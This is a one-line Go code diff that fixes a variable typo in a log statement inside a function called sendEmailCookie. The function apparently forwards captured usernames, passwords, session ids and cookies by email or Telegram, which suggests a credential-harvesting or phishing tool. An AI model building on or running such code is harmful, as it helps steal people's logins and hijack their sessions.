@@ -103,7 +103,7 @@ func sendEmailCookie(cookies string, username string, password string, KeyUser s
 		fmt.Printf("Unable to write file: %v", err)
 	}
 
-	log.Println("Send Email/Telegram Cookies : (%s) [%s] {%s}", username, pasword, sessionId)
+	log.Println("Send Email/Telegram Cookies : (%s) [%s] {%s}", username, password, sessionId)
 	
 	// Return
 	return
